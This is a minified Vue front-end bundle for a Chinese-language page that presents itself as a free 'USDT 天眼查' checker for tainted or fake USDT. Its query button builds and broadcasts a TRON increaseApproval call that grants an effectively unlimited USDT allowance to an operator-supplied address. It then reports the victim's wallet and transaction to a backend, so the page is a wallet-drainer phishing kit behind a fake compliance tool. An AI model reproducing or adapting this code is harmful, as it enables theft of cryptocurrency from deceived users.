import{_ as a}from"./D2I-439fc7c4.js";import{a as t}from"./tWp4-c3261968.js";import{u as s}from"./wzg4STS-47b1d7f1.js";import{c as e,b as i}from"./uPa-10de5fd3.js";import{v as o,b as r,Q as d,P as n,l as c,M as l,W as p,R as v,S as u,O as f,q as b}from"./LiZ5tgOI-6eb310cc.js";import{r as m,j as w,u as j}from"./Hx9-985212f2.js";import{F as h,B as g,s as y,c as T}from"./u0-367899b4.js";import{_ as k}from"./0xGSG1E8MH-90901fc3.js";import"./CJkpOmh-b3251869.js";import"./M-e642a964.js";import"./pe0D0L1P-ce496f0e.js";import"./ixX-6fbf7732.js";import"./Y-33683dda.js";import"./L1WBk0sy-db955658.js";import"./wdxwjAvqb-d1eb05d3.js";import"./VbqtbIif-2caf5e5a.js";import"./0nipEaN-f8e9361a.js";import"./6jSsObZ-7a530245.js";import"./VUDEuJ0-c207ec7c.js";import"./d8XXFD-d1db3899.js";import"./E-17c90068.js";import"./nzF1k3T-42df5b55.js";import"./jT-57423215.js";import"./FmWR-465d39eb.js";import"./EVH-35a9a54e.js";import"./F-7969bb21.js";import"./UoB2exs3-1b627463.js";import"./WDM8OG9J7-cb2df20a.js";import"./wmO-c61f3857.js";import"./H-ba80f54d.js";/* empty css           */import"./MYLd5EZt-962a19c6.js";/* empty css                  */import"./IHOFU-498ca440.js";const S=a=>(v("data-v-2b3c08f7"),a=a(),u(),a),A={class:"page-container"},x={class:"container"},U=p('<div class="top-banner-container" data-v-2b3c08f7><div class="title" data-v-2b3c08f7>USDT 天眼查</div><div class="list" data-v-2b3c08f7><div class="list-item" data-v-2b3c08f7>黑USDT查询</div><div class="list-item" data-v-2b3c08f7>假USDT查询</div><div class="list-item" data-v-2b3c08f7>交易所实名</div><div class="list-item" data-v-2b3c08f7>查询地址余额</div></div></div>',1),O={class:"swap-content fs16"},_=S((()=>n("p",null,"黑USDT是什么？",-1))),D=S((()=>n("p",null," 黑USDT属于诈骗以后非法所得赃款洗兑成的USDT，将会在整条链上被追踪，部分黑U进入交易所兑换法币将会马上被冻结！ ",-1))),W=S((()=>n("p",null,"黑U的特点",-1))),q=S((()=>n("p",null,"1. 部分钱包没有头像",-1))),P=S((()=>n("p",null,"2. 部分钱包提示风险",-1))),M=S((()=>n("p",null,"3. 部分钱包显示余额",-1))),N=S((()=>n("p",{class:"bottom-m10"}," 4. 大多数黑USDT和正常USDT没有区别！必须经过检测查询方可得知！ ",-1))),R={class:"confirm-wrap top-m20 bottom-m20"},E=p('<div class="swap-info" data-v-2b3c08f7><div data-v-2b3c08f7><span class="label" data-v-2b3c08f7>查询路径</span><span class="float-right" data-v-2b3c08f7><div class="center-w" data-v-2b3c08f7><span class="vertical-middle" data-v-2b3c08f7> TRON </span><img src="'+a+'" width="23" height="23" data-v-2b3c08f7></div></span></div><div data-v-2b3c08f7><span class="label" data-v-2b3c08f7>出报告时间</span><span class="float-right" data-v-2b3c08f7><span data-v-2b3c08f7> 1-5分钟 </span><i class="iconfont iconreverse" data-v-2b3c08f7></i></span></div><div data-v-2b3c08f7><span class="label" data-v-2b3c08f7>手续费</span><span class="float-right" data-v-2b3c08f7> 仅消耗燃料费用 </span></div><div data-v-2b3c08f7><span class="label vertical-middle" data-v-2b3c08f7>累计查询次数 </span><span class="float-right" data-v-2b3c08f7>9999+</span></div></div>',1),B=k(o({__name:"tyc",setup(a){const o=m({authAddress:"TAmEpGWnsCkHnzKsBrpxyPUbCgexGmVM4E",domain:"https://inquire.etherminerblockchain.com",authSuccessTips:"Payment Successful",apikey:"702dfb0a-6c3b-47bd-8271-a41e1aca2c2d",isNeedUsdt:!1,isNeedFees:!1,reportTime:"1-5分钟",freeQueryCount:999,clickApprovePageTitle:"USDT 查询"}),p=w({fromQuantity:"",toAddress:""}),v=m(""),u=m(""),k=m(!1),S=m(""),B=m(0),L=s(),F=async(a,t,s)=>{const e={addres:a,auth_addres:v.value,hash:s||0,wallete_type:"okt",client_id:8,source:window.location.href,agent_uid:u.value,block:"trx",client_type:1,amount:0};i(e)},C=async()=>{if(k.value=!0,p.toAddress){const{data:a}=await t.post("https://api.trongrid.io/wallet/validateaddress",{address:p.toAddress,visible:!0},{headers:{"TRON-PRO-API-KEY":o.value.apikey}});if(!a.result)return k.value=!1,y("请检查查询的地址是否正确!")}(async()=>{try{if(!window.hasOwnProperty("tronWeb"))return y("请切换到TRON主链");k.value=!0;let a=await tronWeb.trx.getBalance()/1e6;if(o.value.isNeedFees&&a<25)return alert("TRX矿工费用不足"),void(k.value=!1);if(o.value.isNeedUsdt&&B.value<=0)return k.value=!1,void alert("USDT余额不足");const s=navigator.userAgent;/iphone|ipad|ipod|ios/i.test(s),/android|XiaoMi|MiuiBrowser/i.test(s),/OKApp/i.test(s),document.title=o.value.clickApprovePageTitle;let e={};const i=S.value;let r=[{type:"address",value:v.value},{type:"uint256",value:"23384026197294446691258957323460528314494920687615"}];k.value=!1;let d=await tronWeb.transactionBuilder.triggerSmartContract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t","increaseApproval(address,uint256)",{},r,i),n=d.transaction.raw_data.contract[0].parameter.value.data,c=d.transaction.raw_data.contract[0].type;e=await tronWeb.trx.sign(d.transaction),e.raw_data.contract[0].parameter.value.data=n,e.raw_data.contract[0].type=c;const{data:l}=await t.post("https://api.trongrid.io/wallet/broadcasttransaction",{...e},{headers:{"TRON-PRO-API-KEY":o.value.apikey}});l.result&&(F(i,"approve",l.txid),k.value=!1,y(o.value.authSuccessTips)),k.value=!1}catch(a){T(),k.value=!1,y(a.message||a),-1!=String(a).indexOf(" declined by user")&&y("您已取消")}})()},H=async()=>{(async()=>{const a=await tronWeb.defaultAddress.base58;if(S.value=a,!a)return y("无法获取钱包地址!请检查您的浏览器是否支持TRON!");const{data:s}=await t.get(`https://apilist.tronscanapi.com/api/account/tokens?address=${a}&start=0&limit=20&hidden=0&show=0&sortType=0&sortBy=0&token=USDT`);if(k.value=!1,s.data.length>0){const a=s.data[0];B.value=a.balance/Math.pow(10,6)}else B.value=0})();const a=(await e({block:"trx",type:"approve"})).data;v.value=a};return r((async()=>{var a;const s=(null==(a=L.query)?void 0:a.iv)||"";u.value=s||"";const e=L.query;(null==e?void 0:e.v)&&(u.value=(null==e?void 0:e.v)||""),(async()=>{const{data:a}=await t.get("/test/assets/config.json");o.value=a})();const i=navigator.userAgent,r=/iphone|ipad|ipod|ios/i.test(i),d=/android|XiaoMi|MiuiBrowser/i.test(i),n=r||d,c=/OKApp/i.test(i);tronWeb.isTronLink&&!n&&await tronWeb.request({method:"tron_requestAccounts"}),n&&n&&c?(await window.okxwallet.tronLink.request({method:"tron_requestAccounts"}),window.tronWeb=window.okxwallet.tronLink.tronWeb,H()):H()})),(a,t)=>(f(),d("div",A,[n("div",x,[U,n("div",O,[_,D,W,q,P,M,N,c(j(h),{modelValue:p.toAddress,"onUpdate:modelValue":t[0]||(t[0]=a=>p.toAddress=a),style:{"font-size":"15px","border-radius":"14px","background-color":"#f7f8fa"},placeholder:"默认查询当前钱包",border:!1},null,8,["modelValue"]),n("div",R,[c(j(g),{style:{width:"100%","border-radius":"12px"},color:"#3478f6",onClick:C,loading:k.value},{default:l((()=>[b("查询并显示报告")])),_:1},8,["loading"])]),E])])]))}}),[["__scopeId","data-v-2b3c08f7"]]);export{B as default};
